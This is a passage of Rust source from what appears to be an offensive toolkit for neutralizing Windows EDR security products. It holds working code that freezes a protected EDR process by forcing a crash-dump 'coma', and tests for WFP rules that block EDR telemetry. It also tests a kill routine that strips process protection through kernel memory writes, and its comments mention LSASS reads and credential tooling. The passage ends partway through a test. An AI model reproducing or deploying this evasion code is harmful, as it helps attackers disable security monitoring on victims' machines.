                Err(rb_err) => Err(KitError::Other(format!(
                    "Kill failed ({}) AND protection rollback failed ({}) — \
                     pid {} is left ALIVE with PPL stripped; re-run or restore manually",
                    term_err, rb_err, pid
                ))),
            },
        }
    }
}

impl EdrNeutralizeKit for EdrNeutralizer {
    fn kill_kva(&self, krw: &dyn KernelRw, pid: u32) -> Result<usize, KitError> {
        self.kill(krw, pid)
    }

    fn neutralize(&self, _pid: u32, m: NeutralizeMethod) -> Result<(), KitError> {
        // Note: the trait doesn't pass a KernelRw. Kill needs one (to strip
        // PPL before the user-mode terminate), so it lives on
        // `EdrNeutralizer::kill(krw, pid)`; a bare user-mode terminate attempt
        // here would falsely "fail" on every protected target.
        // Freeze + Choke are user-mode tiers (operator wires the FFI).
        match m {
            NeutralizeMethod::Kill => Err(KitError::UnsupportedPosture(
                "Kill: use EdrNeutralizer::kill(krw, pid) directly — the trait has no \
                 KernelRw param; kill() strips PPL via kernel data writes and then \
                 terminates from user mode (with protection rollback on failure)",
            )),
            NeutralizeMethod::Freeze => freeze_edr_coma(_pid),
            NeutralizeMethod::Choke => choke_edr_qos(_pid),
        }
    }
}

// ---- §2.5a Freeze — WerFaultSecure Coma ------------------------------------
//
// Trigger a crash dump of the target (PPL) process via MiniDumpWriteDump.
// The Windows Error Reporting (WER) infrastructure intercepts the dump and
// enters a "PPL coma" — the process is alive but completely unresponsive,
// producing zero telemetry.  This is user-mode-only (no KernelRw needed)
// but requires admin + PROCESS_VM_READ access to the target.
//
// Algorithm:
// 1. OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_VM_READ, pid)
// 2. Create a temp file (NtCreateFile or CreateFileW) for the dump output.
// 3. Resolve MiniDumpWriteDump from dbghelp.dll.
// 4. Call MiniDumpWriteDump(edr_handle, pid, file_handle, MiniDumpWithFullMemory, …).
// 5. The PPL process enters "WER coma" — alive but unresponsive.
// 6. Do NOT close the dump file handle — keeping it open maintains the coma.
//    The operator closes it when they want the EDR to recover.

/// MINIDUMP_TYPE: MiniDumpWithFullMemory — dump the entire process address
/// space. This is the most reliable way to trigger WER coma on PPL targets.
#[allow(dead_code)] // used by freeze_edr_coma (#[cfg(target_os = "windows")])
const MINIDUMP_WITH_FULL_MEMORY: u32 = 0x00000002;

/// PROCESS_QUERY_LIMITED_INFORMATION = 0x0400
#[allow(dead_code)] // used by freeze_edr_coma (#[cfg(target_os = "windows")])
const PROCESS_QUERY_LIMITED: u32 = 0x0400;
/// PROCESS_VM_READ = 0x0010
#[allow(dead_code)] // used by freeze_edr_coma (#[cfg(target_os = "windows")])
const PROCESS_VM_READ_FLAG: u32 = 0x0010;

/// Trigger WerFaultSecure coma on a PPL process by initiating a full memory
/// crash dump. The process enters "PPL coma" — alive but unresponsive.
///
/// # Safety
/// Contains raw FFI calls (OpenProcess, CreateFileW, MiniDumpWriteDump).
/// Safe in operator context: single-threaded, no shared state.
#[cfg(target_os = "windows")]
fn freeze_edr_coma(pid: u32) -> Result<(), KitError> {
    use core::ffi::c_void;

    // FFI types.
    type OpenProcessFn = unsafe extern "system" fn(u32, i32, u32) -> *mut c_void;
    type CreateFileWFn = unsafe extern "system" fn(
        *const u16,
        u32,
        u32,
        *mut c_void,
        u32,
        u32,
        *mut c_void,
    ) -> *mut c_void;
    type CloseHandleFn = unsafe extern "system" fn(*mut c_void) -> i32;

    /// MiniDumpWriteDump — from dbghelp.dll. Takes 7 parameters.
    type MiniDumpWriteDumpFn = unsafe extern "system" fn(
        *mut c_void, // hProcess
        u32,         // ProcessId
        *mut c_void, // hFile
        u32,         // DumpType
        *mut c_void, // ExceptionParam (null)
        *mut c_void, // UserStreamParam (null)
        *mut c_void, // CallbackParam (null)
    ) -> i32;

    // 1. Resolve FFI functions.
    let open_process: OpenProcessFn =
        unsafe { crate::win::resolve::resolve_sym(b"kernel32.dll", b"OpenProcess") }
            .map_err(|_| KitError::Other("OpenProcess unresolved".into()))?;

    let create_file_w: CreateFileWFn =
        unsafe { crate::win::resolve::resolve_sym(b"kernel32.dll", b"CreateFileW") }
            .map_err(|_| KitError::Other("CreateFileW unresolved".into()))?;

    let close_handle: CloseHandleFn =
        unsafe { crate::win::resolve::resolve_sym(b"kernel32.dll", b"CloseHandle") }
            .map_err(|_| KitError::Other("CloseHandle unresolved".into()))?;

    let mini_dump: MiniDumpWriteDumpFn =
        unsafe { crate::win::resolve::resolve_sym(b"dbghelp.dll", b"MiniDumpWriteDump") }.map_err(
            |_| KitError::Other("MiniDumpWriteDump unresolved — dbghelp.dll not available".into()),
        )?;

    // 2. Open the target EDR process.
    let access = PROCESS_QUERY_LIMITED | PROCESS_VM_READ_FLAG;
    let h_process = unsafe { open_process(access, 0, pid) };
    if h_process.is_null() {
        return Err(KitError::Other(format!(
            "OpenProcess failed for EDR pid {} — access denied or process exited",
            pid
        )));
    }

    // 3. Create a temp file for the dump output.
    //    Path: \??\Temp\nyx_freeze_<pid>.dmp (Win32-style via CreateFileW).
    //    Using a fixed path for simplicity; a real impl would use a random name.
    let mut path_buf = [0u16; 64];
    let prefix = b"\\\\?\\C:\\Windows\\Temp\\nyx_freeze_";
    let suffix = b".dmp";
    let mut pos = 0;
    for &b in prefix.iter() {
        if pos < path_buf.len() {
            path_buf[pos] = b as u16;
            pos += 1;
        }
    }
    // Write PID as decimal.
    let mut pid_str = [0u8; 10];
    let mut pid_digits = 0u32;
    let mut p = pid;
    if p == 0 {
        pid_str[0] = b'0';
        pid_digits = 1;
    } else {
        while p > 0 && pid_digits < 10 {
            pid_str[pid_digits as usize] = b'0' + (p % 10) as u8;
            p /= 10;
            pid_digits += 1;
        }
        // Reverse digits.
        let mut i = 0u32;
        while i < pid_digits / 2 {
            let tmp = pid_str[i as usize];
            pid_str[i as usize] = pid_str[(pid_digits - 1 - i) as usize];
            pid_str[(pid_digits - 1 - i) as usize] = tmp;
            i += 1;
        }
    }
    for i in 0..pid_digits {
        if pos < path_buf.len() {
            path_buf[pos] = pid_str[i as usize] as u16;
            pos += 1;
        }
    }
    for &b in suffix.iter() {
        if pos < path_buf.len() {
            path_buf[pos] = b as u16;
            pos += 1;
        }
    }
    // path_buf is already null-terminated (zero-initialized).

    // CREATE_ALWAYS = 2, FILE_ATTRIBUTE_NORMAL = 0x80
    let h_file = unsafe {
        create_file_w(
            path_buf.as_ptr(),
            0x80000000 | 0x40000000, // GENERIC_READ | GENERIC_WRITE
            0,                       // no sharing
            core::ptr::null_mut(),
            2,    // CREATE_ALWAYS
            0x80, // FILE_ATTRIBUTE_NORMAL
            core::ptr::null_mut(),
        )
    };
    if h_file.is_null() || h_file as isize == -1 {
        let _ = unsafe { close_handle(h_process) };
        return Err(KitError::Other(format!(
            "CreateFileW failed for dump file — is C:\\Windows\\Temp writable?"
        )));
    }

    // 4. Call MiniDumpWriteDump — this triggers WER on the PPL target.
    let result = unsafe {
        mini_dump(
            h_process,
            pid,
            h_file,
            MINIDUMP_WITH_FULL_MEMORY,
            core::ptr::null_mut(), // ExceptionParam
            core::ptr::null_mut(), // UserStreamParam
            core::ptr::null_mut(), // CallbackParam
        )
    };

    // 5. Close handles. The WER coma was triggered by MiniDumpWriteDump and
    //    persists for the dump-session lifetime regardless of handle closure.
    //    Keeping the file handle open is a forensic trace (handle-table leak);
    //    we close it here so the operator never leaks a permanent handle.
    let _ = unsafe { close_handle(h_process) };
    let _ = unsafe { close_handle(h_file) };

    if result == 0 {
        return Err(KitError::Other(format!(
            "MiniDumpWriteDump returned false for pid {} — WER coma may be \
             partial (PPL processes commonly produce partial dumps). The target \
             process is likely in PPL coma regardless.",
            pid
        )));
    }

    Ok(())
}

#[cfg(not(target_os = "windows"))]
fn freeze_edr_coma(_pid: u32) -> Result<(), KitError> {
    Err(KitError::UnsupportedPosture(
        "Freeze (WerFaultSecure coma) is Windows-only",
    ))
}

// ---- §2.5b Choke — EDRChoker QoS Throttle ---------------------------------
//
// Throttle the EDR's network bandwidth to 8 bit/s via the Windows QoS
// Packet Scheduler (pacer.sys). This is below WFP — no WFP events are
// generated. The EDR's TLS handshake times out and telemetry cannot be sent.
// Lowest-noise option. User-mode, admin required.
//
// The QoS throttle is applied by opening the target process's TCP sockets
// via the QoS2 API (qWave) or by direct pacer.sys IOCTL. The qWave approach
// is more portable: QOSCreateHandle → QOSAddAppFilter → QOSSetFlow with a
// bandwidth limit of 8 bit/s = 1 byte/s — at that rate the EDR's TLS
// handshake (typically 2-5 KB) takes 2000-5000 seconds, effectively blocking
// all telemetry.
//
// STATUS (kernelsdk-2-3): REFUSES. QoS2 binds a throttle to the target via
// its image path (AppId) or a keyed filter config — NOT by PID — and this
// framework has no pid→image-path resolution wired. The previous
// implementation installed a zero-field filter with a null AppId and
// swallowed every error, "succeeding" while actually throttling the
// OPERATOR'S OWN process (QoS2 binds null-AppId filters to the calling
// process). That false-success path is removed: choke_edr_qos returns a
// clear error until filter population is wired, and a wired implementation
// MUST propagate QOSAddAppFilter/QOSSetFlow failures (never `let _ =`).

/// Validate a Choke target before any QoS work: `pid` must be a real process.
/// PID 0 is the idle/system pseudo-PID and is never a valid throttle target.
/// Shared by the Windows path and the non-Windows floor; host-testable.
fn validate_choke_pid(pid: u32) -> Result<(), KitError> {
    if pid == 0 {
        return Err(KitError::Other(
            "choke_edr_qos: pid 0 is not a valid throttle target".into(),
        ));
    }
    Ok(())
}

/// Throttle an EDR process's network bandwidth to 8 bit/s via the Windows
/// QoS Packet Scheduler. The EDR's TLS handshake times out and telemetry
/// cannot be sent. Lowest-noise option — no WFP events, no packet-drop traces.
///
/// **STATUS: refuses (kernelsdk-2-3).** The per-process QoS filter cannot be
/// populated in this framework: QoS2 binds by AppId/image-path, not PID, and
/// no pid→image-path resolution is wired. The previous implementation
/// installed a zero-field, null-AppId filter and ignored every failure —
/// falsely reporting success while throttling the operator's OWN process
/// (null-AppId filters bind to the calling process). That false-success path
/// is removed; this function returns a clear error instead. A wired
/// implementation must populate the filter for `pid` and propagate
/// `QOSAddAppFilter`/`QOSSetFlow` failures.
#[cfg(target_os = "windows")]
fn choke_edr_qos(pid: u32) -> Result<(), KitError> {
    validate_choke_pid(pid)?;
    // No QoS FFI is invoked: the filter cannot be populated, so any handle
    // created and any flow set would be a lie (a self-throttle). Refuse
    // loudly instead of reporting success for an action that never happened.
    Err(KitError::UnsupportedPosture(
        "choke_edr_qos: per-process QoS filter cannot be populated — QoS2 binds by \
         AppId/image-path, not PID, and no path resolution is wired here; a null-AppId \
         zero-field filter would throttle the operator's own process. Wire image-path \
         resolution (propagating QOSAddAppFilter/QOSSetFlow failures) or use the \
         WFP/Kill tiers.",
    ))
}
#[cfg(not(target_os = "windows"))]
fn choke_edr_qos(pid: u32) -> Result<(), KitError> {
    validate_choke_pid(pid)?;
    Err(KitError::UnsupportedPosture(
        "Choke (EDRChoker QoS throttle) is Windows-only",
    ))
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::KrwError;

    #[test]
    fn wfp_rules_any_any_per_pid() {
        let rules = UserModeEdrSilencer::rules_for(&[1234, 5678]);
        assert_eq!(rules.len(), 2);
        assert_eq!(rules[0].pid, 1234);
        assert_eq!(rules[0].protocol, 0); // any
        assert_eq!(rules[0].port, 0); // any
        assert_eq!(rules[1].pid, 5678);
    }

    #[test]
    fn wfp_rules_empty_for_empty_pids() {
        assert!(UserModeEdrSilencer::rules_for(&[]).is_empty());
    }

    // ---- WFP resilience tests (task #4d) -------------------------------------
    //
    // The session-scoped RAII guard makes filter residue impossible BY
    // CONSTRUCTION: filters live only as long as the returned WfpSilenceGuard,
    // and the guard's Drop closes the BFE session (auto-removing them). These
    // tests cover the cross-platform invariants of that contract. The
    // Windows-only FFI path (real filter add + Drop→FwpmEngineClose0) is
    // verified on-target; here we lock down: (a) rule generation is idempotent
    // (no accumulator state, so repeated silence calls don't compound), (b)
    // the empty-PID guard is never created (the trait rejects before any FFI),
    // (c) the floor refuses to create a guard (so a stale guard never leaks on
    // a non-Windows host), and (d) rule shape is stable across calls.

    #[test]
    fn wfp_rules_idempotent_no_accumulator_state() {
        // rules_for must be pure — calling it twice with the same PIDs yields
        // identical rules. This is the precondition for "re-silencing after a
        // network reconnect doesn't double-install": there's no module-level
        // accumulator that could compound, each call is a fresh Vec.
        let a = UserModeEdrSilencer::rules_for(&[111, 222, 333]);
        let b = UserModeEdrSilencer::rules_for(&[111, 222, 333]);
        assert_eq!(a.len(), b.len());
        for (ra, rb) in a.iter().zip(b.iter()) {
            assert_eq!(ra.pid, rb.pid);
            assert_eq!(ra.protocol, rb.protocol);
            assert_eq!(ra.port, rb.port);
        }
    }

    #[test]
    fn wfp_rules_one_rule_per_pid_no_dedup_needed() {
        // Each PID gets exactly one any/any block — there's no port-matrix
        // expansion that could surprise an operator counting filters. Repeated
        // PIDs are passed through verbatim (dedup is the caller's job).
        let rules = UserModeEdrSilencer::rules_for(&[42, 42, 42]);
        assert_eq!(rules.len(), 3);
        assert!(rules.iter().all(|r| r.pid == 42));
    }

    #[test]
    fn wfp_silence_rejects_empty_pids_without_guard() {
        // The trait guard rejects an empty PID list BEFORE any FFI call. This
        // means a misconfigured silence request can never create an empty
        // guard (which would open+close a BFE session for nothing, leaving an
        // Event ID 5447 trace with no actual silence). The error is the same
        // UnsupportedPosture variant used by the NoKernel floor.
        let silencer = UserModeEdrSilencer;
        let res = WfpKit::silence_edr(&silencer, &[]);
        assert!(res.is_err());
        match res {
            Err(KitError::UnsupportedPosture(_)) => {}
            Err(other) => panic!("expected UnsupportedPosture for empty PIDs, got {other:?}"),
            // A guard on empty input would be a contract violation (no PIDs to
            // silence → nothing to install → the trait must refuse up-front).
            Ok(_) => panic!("empty PID list must not produce a guard"),
        }
    }

    #[test]
    fn wfp_floor_guard_never_constructed_off_target() {
        // On a non-Windows host the session constructor MUST refuse, so a
        // stale guard can never escape into operator code. This is the residue
        // guarantee from the other direction: if we can't really install
        // filters, we return Err rather than a hollow guard whose Drop would
        // be a lie. (On Windows this same path would hit the FFI; here it's
        // the floor.)
        let res = wfp_open_silence_session(&[WfpBlockRule {
            pid: 1,
            protocol: 0,
            port: 0,
        }]);
        // Floor returns Err on non-Windows; on Windows the FFI path runs and
        // (without a real BFE) also returns Err. Either way: no guard leaked.
        assert!(res.is_err());
    }

    // ---- WFP ALE_APP_ID condition/filter shape (P0-9 fix) ------------------
    //
    // The condition + filter construction is pure data (no FFI), so the exact
    // byte-level shape the Windows path hands to FwpmFilterAdd0 is locked down
    // on the host. The Windows-only plumbing (pid→image path→AppId, RAII
    // blob free, real FwpmFilterAdd0) is verified on-target.

    #[test]
    fn wfp_guids_match_windows_sdk() {
        // FWPM_LAYER_ALE_AUTH_CONNECT_V4 {c38d57d1-05a7-4c33-904f-7fbceee60e82}
        assert_eq!(
            LAYER_ALE_AUTH_CONNECT_V4.0,
            [
                0xD1, 0x57, 0x8D, 0xC3, 0xA7, 0x05, 0x33, 0x4C, 0x90, 0x4F, 0x7F, 0xBC, 0xEE, 0xE6,
                0x0E, 0x82,
            ]
        );
        // FWPM_CONDITION_ALE_APP_ID {d78e1e87-8644-4ea5-9437-d809ecefc971}
        assert_eq!(
            CONDITION_ALE_APP_ID.0,
            [
                0x87, 0x1E, 0x8E, 0xD7, 0x44, 0x86, 0xA5, 0x4E, 0x94, 0x37, 0xD8, 0x09, 0xEC, 0xEF,
                0xC9, 0x71,
            ]
        );
    }

    #[test]
    fn wfp_struct_layouts_match_sdk_x64() {
        // Sizes pin the repr(C) layouts against the SDK (x64): a field-order
        // or alignment regression would shift every offset FwpmFilterAdd0 reads.
        assert_eq!(core::mem::size_of::<FwpByteBlob>(), 16);
        assert_eq!(core::mem::size_of::<FwpConditionValue0>(), 16);
        assert_eq!(core::mem::size_of::<FwpmFilterCondition0>(), 40);
        assert_eq!(core::mem::size_of::<FwpmFilter0>(), 200);
    }

    #[test]
    fn wfp_session0_layout_matches_sdk() {
        // FWPM_SESSION0 x64: 72 bytes; flags@32, processId@40, sid@48,
        // kernelMode@64. The DYNAMIC flag is the no-residue contract — pin it.
        assert_eq!(core::mem::size_of::<FwpmSession0>(), 72);
        assert_eq!(core::mem::offset_of!(FwpmSession0, flags), 32);
        assert_eq!(core::mem::offset_of!(FwpmSession0, process_id), 40);
        assert_eq!(core::mem::offset_of!(FwpmSession0, sid), 48);
        assert_eq!(core::mem::offset_of!(FwpmSession0, kernel_mode), 64);
        assert_eq!(WFP_SESSION_FLAG_DYNAMIC, 0x1);
        let s = FwpmSession0::dynamic(1234);
        assert_eq!(s.flags, WFP_SESSION_FLAG_DYNAMIC);
        assert_eq!(s.process_id, 1234);
        assert!(
            !s.display_name.is_null(),
            "NULL display name rejected (FWP_E_NULL_DISPLAY_NAME)"
        );
    }

    #[test]
    fn wfp_app_id_condition_shape() {
        let mut blob = FwpByteBlob {
            size: 8,
            data: 0x1000 as *mut u8,
        };
        let cond = ale_app_id_condition(&mut blob);
        assert_eq!(cond.field_key, CONDITION_ALE_APP_ID);
        assert_eq!(cond.match_type, FWP_MATCH_EQUAL);
        assert_eq!(cond.condition_value.value_type, FWP_BYTE_BLOB_TYPE);
        assert_eq!(
            cond.condition_value.byte_blob,
            &mut blob as *mut FwpByteBlob
        );
    }

    #[test]
    fn wfp_block_filter_has_exactly_one_condition() {
        // P0-9 regression: the filter must ALWAYS carry exactly one
        // ALE_APP_ID condition. num_filter_conditions=0 would match ALL
        // outbound IPv4 traffic on the host — the constructor below is the
        // only one that exists, and it hard-wires 1.
        let mut blob = FwpByteBlob {
            size: 4,
            data: core::ptr::null_mut(),
        };
        let cond = ale_app_id_condition(&mut blob);
        let filter = FwpmFilter0::block_outbound_app_id(&cond);
        assert_eq!(filter.num_filter_conditions, 1);
        assert_eq!(
            filter.filter_conditions,
            &cond as *const FwpmFilterCondition0
        );
        assert_eq!(filter.layer_key, LAYER_ALE_AUTH_CONNECT_V4);
        assert_eq!(filter.action_type, FWP_ACTION_BLOCK);
        assert_eq!(filter.flags, 0); // never PERSISTENT — session-scoped
        assert_eq!(filter.sublayer_key, NYX_WFP_SUBLAYER);
        assert_eq!(filter.weight_type, FWP_UINT8);
        assert_eq!(filter.weight_value, FWP_FILTER_WEIGHT_MAX_RANGE);
        assert!(!filter.display_name.is_null());
    }

    #[test]
    fn wfp_filter0_field_offsets_match_sdk() {
        assert_eq!(core::mem::offset_of!(FwpmFilter0, sublayer_key), 80);
        assert_eq!(core::mem::offset_of!(FwpmFilter0, weight_type), 96);
        assert_eq!(
            core::mem::offset_of!(FwpmFilter0, num_filter_conditions),
            112
        );
        assert_eq!(core::mem::offset_of!(FwpmFilter0, action_type), 128);
    }

    #[test]
    fn wfp_sublayer0_layout_matches_sdk() {
        assert_eq!(core::mem::size_of::<FwpmSubLayer0>(), 72);
        assert_eq!(core::mem::offset_of!(FwpmSubLayer0, flags), 32);
        assert_eq!(core::mem::offset_of!(FwpmSubLayer0, provider_key), 40);
        assert_eq!(core::mem::offset_of!(FwpmSubLayer0, weight), 64);
        let s = FwpmSubLayer0::nyx();
        assert_eq!(s.weight, WFP_SUBLAYER_WEIGHT);
        assert_eq!(s.flags, 0);
        assert_eq!(s.sublayer_key, NYX_WFP_SUBLAYER);
        assert!(!s.display_name.is_null());
    }

    #[test]
    fn wfp_skip_vs_fail_classifies_engine_status() {
        // Access denied / BFE down → env skip, not a product failure.
        assert_eq!(wfp_status_env_limit(5), Some("access denied (not admin)"));
        assert_eq!(
            wfp_status_env_limit(0x8007_0005),
            Some("access denied (not admin)")
        );
        assert_eq!(wfp_status_env_limit(1058), Some("BFE service disabled"));
        assert_eq!(
            wfp_status_env_limit(1722),
            Some("BFE RPC unavailable (service stopped)")
        );
        assert_eq!(
            wfp_status_env_limit(0x8007_06BA),
            Some("BFE RPC unavailable (service stopped)")
        );
        assert_eq!(
            wfp_status_env_limit(1753),
            Some("BFE RPC endpoint not registered (service stopped)")
        );
        // Product bugs stay failures — FWP_E_NULL_DISPLAY_NAME (0x80320023).
        assert_eq!(wfp_status_env_limit(0x8032_0023), None);
        assert_eq!(wfp_status_env_limit(0), None);

        let skip =
            KitError::Other("env_limit:access denied (not admin) (FwpmEngineOpen0=5)".into());
        assert!(wfp_error_is_env_limit(&skip).is_some());
        let fail = KitError::Other("FwpmFilterAdd0 failed for pid 4: 2152202275".into());
        assert!(wfp_error_is_env_limit(&fail).is_none());
        let posture = KitError::UnsupportedPosture("no EDR PIDs provided");
        assert!(wfp_error_is_env_limit(&posture).is_none());
    }

    #[test]
    fn wfp_image_paths_equal_normalizes_win32_forms() {
        assert!(wfp_image_paths_equal(
            r"C:\Temp\nyx_wfp_probe_1.exe",
            r"c:\temp\nyx_wfp_probe_1.exe"
        ));
        assert!(wfp_image_paths_equal(
            r"\\?\C:\Temp\a.exe",
            r"C:\Temp\a.exe"
        ));
        assert!(wfp_image_paths_equal(r"C:/Temp/a.exe", r"C:\Temp\a.exe"));
        assert!(!wfp_image_paths_equal(r"C:\Temp\a.exe", r"C:\Temp\b.exe"));
        assert!(!wfp_image_paths_equal("", r"C:\Temp\a.exe"));
        assert!(!wfp_image_paths_equal(r"C:\Temp\a.exe", ""));
    }

    #[test]
    fn directory_table_base_is_early_field() {
        // DTB is a near-zero offset field; sanity-pin it so a future "drift"
        // doesn't silently break LSASS reads. 0x028 on every x64 build tested.
        assert_eq!(DIRECTORY_TABLE_BASE, 0x028);
        assert!(DIRECTORY_TABLE_BASE < 0x100);
    }

    // ---- EdrNeutralizer / CredKit tests ----
    use alloc::collections::BTreeMap;
    use spin::mutex::Mutex;

    fn test_offsets() -> crate::offsets::EprocessOffsets {
        crate::offsets::for_build(17763).unwrap().offsets
    }

    struct MockKrw(Mutex<BTreeMap<usize, u8>>);
    impl MockKrw {
        fn new() -> Self {
            Self(Mutex::new(BTreeMap::new()))
        }
        fn set_u64(&self, addr: usize, val: u64) {
            let mut m = self.0.lock();
            for (i, b) in val.to_le_bytes().iter().enumerate() {
                m.insert(addr + i, *b);
            }
        }
    }
    impl KernelRw for MockKrw {
        fn kread(&self, kaddr: usize, dst: &mut [u8]) -> Result<(), KrwError> {
            let m = self.0.lock();
            for (i, b) in dst.iter_mut().enumerate() {
                *b = *m.get(&(kaddr + i)).unwrap_or(&0);
            }
            Ok(())
        }
        fn kwrite(&self, kaddr: usize, src: &[u8]) -> Result<(), KrwError> {
            let mut m = self.0.lock();
            for (i, b) in src.iter().enumerate() {
                m.insert(kaddr + i, *b);
            }
            Ok(())
        }
    }

    /// Set up a mock process list with two EPROCESSes (PID 100 @ 0x5000,
    /// PID 200 @ 0x6000) and a DTB at DIRECTORY_TABLE_BASE offset.
    fn setup_process_list(krw: &MockKrw, offsets: &crate::offsets::EprocessOffsets) {
        setup_process_list_at(krw, offsets, 0x1000, 0x5000, 0x6000);
    }

    /// Address-parameterized variant: `ProtectionSnapshot::strip` refuses
    /// non-canonical EPROCESS KVAs, so tests that exercise the strip path
    /// (EdrNeutralizer::kill) must place the list in kernel space.
    fn setup_process_list_at(
        krw: &MockKrw,
        offsets: &crate::offsets::EprocessOffsets,
        head: usize,
        e1: usize,
        e2: usize,
    ) {
        let l1 = e1 + offsets.active_process_links;
        let l2 = e2 + offsets.active_process_links;
        krw.set_u64(head, l1 as u64);
        krw.set_u64(l1, l2 as u64);
        krw.set_u64(l1 + 8, head as u64);
        krw.set_u64(l2, head as u64);
        krw.set_u64(l2 + 8, l1 as u64);
        krw.set_u64(e1 + offsets.unique_process_id, 100);
        krw.set_u64(e2 + offsets.unique_process_id, 200);
        // DTB for both (non-zero, so pagewalk doesn't reject them).
        krw.set_u64(e1 + DIRECTORY_TABLE_BASE, 0x10000);
        krw.set_u64(e2 + DIRECTORY_TABLE_BASE, 0x20000);
    }

    #[test]
    fn edr_neutralizer_kill_finds_eprocess() {
        let krw = MockKrw::new();
        let offsets = test_offsets();
        // Canonical kernel KVAs — strip() refuses non-canonical EPROCESS
        // addresses (a corrupt find_eprocess result must never be written to).
        let head = 0xFFFF_8000_0000_1000usize;
        let e1 = 0xFFFF_8000_0000_5000usize;
        let e2 = 0xFFFF_8000_0000_6000usize;
        setup_process_list_at(&krw, &offsets, head, e1, e2);
        let kit = EdrNeutralizer {
            ps_active_process_head_kva: head,
            offsets,
        };
        #[cfg(target_os = "windows")]
        {
            // Terminate step stubbed through the kill_with seam: this test's
            // assertion target is the pid→EPROCESS list walk. The real
            // terminate would OpenProcess(PROCESS_TERMINATE) a REAL host pid —
            // environment-dependent (access denied on CI runners where pid
            // 100 is protected) and potentially destructive (an openable pid
            // 100 would actually be killed). Caught by the windows-latest
            // standalone-tests gate 2026-08-24.
            // PID 100 → EPROCESS at e1.
            assert_eq!(kit.kill_with(&krw, 100, |_| Ok(())).unwrap(), e1);
            // PID 200 → EPROCESS at e2.
            assert_eq!(kit.kill_with(&krw, 200, |_| Ok(())).unwrap(), e2);
        }
        #[cfg(not(target_os = "windows"))]
        {
            // TerminateProcess is Windows-only: kill() strips PPL, the
            // user-mode terminate fails, and the protection bytes MUST be
            // rolled back (a failed Kill never leaves the target unprotected).
            let mut b = [0x61u8];
            krw.kwrite(e1 + offsets.protection, &b).unwrap();
            assert!(matches!(
                kit.kill(&krw, 100),
                Err(KitError::UnsupportedPosture(_))
            ));
            krw.kread(e1 + offsets.protection, &mut b).unwrap();
            assert_eq!(b[0], 0x61, "failed kill must roll back the PPL strip");
        }
        // PID 999 → NotFound.
        assert!(matches!(kit.kill(&krw, 999), Err(KitError::NotFound)));
    }

    #[test]
    fn edr_neutralizer_kill_needs_ps_active_process_head() {
        let krw = MockKrw::new();
        let offsets = test_offsets();
        let kit = EdrNeutralizer {
            ps_active_process_head_kva: 0,
            offsets,
        };
        assert!(matches!(
            kit.kill(&krw, 100),
            Err(KitError::UnsupportedPosture(_))
        ));
    }

    /// EPROCESS KVAs in canonical kernel space + the three protection offsets
    /// as locals (the offsets struct moves into the kit).
    macro_rules! kill_fixture {
        ($krw:ident) => {{
            let offsets = test_offsets();
            let head = 0xFFFF_8000_0000_1000usize;
            let e1 = 0xFFFF_8000_0000_5000usize;
            let e2 = 0xFFFF_8000_0000_6000usize;
            setup_process_list_at(&$krw, &offsets, head, e1, e2);
            let (prot, sig, ssig) = (
                offsets.protection,
                offsets.signature_level,
                offsets.section_signature_level,
            );
            // Pretend the target is PPL-protected (0x61 = Protected|WinTcb).
            $krw.kwrite(e1 + prot, &[0x61]).unwrap();
            $krw.kwrite(e1 + sig, &[0x08]).unwrap();
            $krw.kwrite(e1 + ssig, &[0x08]).unwrap();
            let kit = EdrNeutralizer {
                ps_active_process_head_kva: head,
                offsets,
            };
            (kit, e1, [prot, sig, ssig])
        }};
    }

    #[test]
    fn edr_neutralizer_kill_success_leaves_strip_in_place() {
        // Injected terminator succeeds → kill returns the EPROCESS KVA and the
        // zeroed protection bytes stay zeroed (the EPROCESS is being torn
        // down by the kernel, so the strip is intentionally not rolled back).
        let krw = MockKrw::new();
        let (kit, e1, prot_offsets) = kill_fixture!(krw);
        assert_eq!(kit.kill_with(&krw, 100, |_| Ok(())).unwrap(), e1);
        let mut b = [0xFFu8];
        for off in prot_offsets {
            krw.kread(e1 + off, &mut b).unwrap();
            assert_eq!(b[0], 0, "successful kill leaves the PPL strip in place");
        }
    }

    #[test]
    fn edr_neutralizer_kill_terminate_failure_rolls_back() {
        // Injected terminator fails → the terminate error (not a rollback
        // error) is surfaced and every protection byte is restored.
        let krw = MockKrw::new();
        let (kit, e1, prot_offsets) = kill_fixture!(krw);
        let expected = [0x61u8, 0x08, 0x08];
        let err = kit
            .kill_with(&krw, 100, |_| {
                Err(KitError::Other("injected terminate failure".into()))
            })
            .unwrap_err();
        assert!(
            matches!(&err, KitError::Other(m) if m.contains("injected terminate failure")),
            "terminate error must propagate, got {err:?}"
        );
        let mut b = [0u8; 1];
        for (off, want) in prot_offsets.iter().zip(expected.iter()) {
            krw.kread(e1 + off, &mut b).unwrap();
            assert_eq!(&b[0], want, "failed kill must roll back the PPL strip");
        }
    }

    /// MockKrw wrapper whose writes of non-zero bytes fail. The PPL strip
    /// writes zeros (succeeds); the rollback writes the saved non-zero bytes
    /// (fails) — exercising kill's worst-case double-failure path.
    struct RestoreFailKrw(MockKrw);
    impl KernelRw for RestoreFailKrw {
        fn kread(&self, kaddr: usize, dst: &mut [u8]) -> Result<(), KrwError> {
            self.0.kread(kaddr, dst)
        }
        fn kwrite(&self, kaddr: usize, src: &[u8]) -> Result<(), KrwError> {
            if src.iter().any(|&b| b != 0) {
                return Err(KrwError::Unavailable("write blocked by mock"));
            }
            self.0.kwrite(kaddr, src)
        }
    }

    #[test]
    fn edr_neutralizer_kill_rollback_failure_reports_living_unprotected_target() {
        // Terminate fails AND rollback fails → kill must say so explicitly
        // (target left ALIVE with PPL stripped), never a false success.
        let inner = MockKrw::new();
        let offsets = test_offsets();
        let head = 0xFFFF_8000_0000_1000usize;
        let e1 = 0xFFFF_8000_0000_5000usize;
        let e2 = 0xFFFF_8000_0000_6000usize;
        setup_process_list_at(&inner, &offsets, head, e1, e2);
        inner.kwrite(e1 + offsets.protection, &[0x61]).unwrap();
        let krw = RestoreFailKrw(inner);
        let kit = EdrNeutralizer {
            ps_active_process_head_kva: head,
            offsets,
        };
        let err = kit
            .kill_with(&krw, 100, |_| {
                Err(KitError::Other("injected terminate failure".into()))
            })
            .unwrap_err();
        assert!(
            matches!(&err, KitError::Other(m) if m.contains("ALIVE with PPL stripped")),
            "double failure must be reported honestly, got {err:?}"
        );
    }

    #[test]
    fn edr_neutralizer_kill_refuses_noncanonical_eprocess_kva() {
        // Out-of-bounds guard: a corrupt find_eprocess result (a user-space
        // address) must be refused by ProtectionSnapshot::strip BEFORE any
        // write, and the bytes at the bogus address stay untouched.
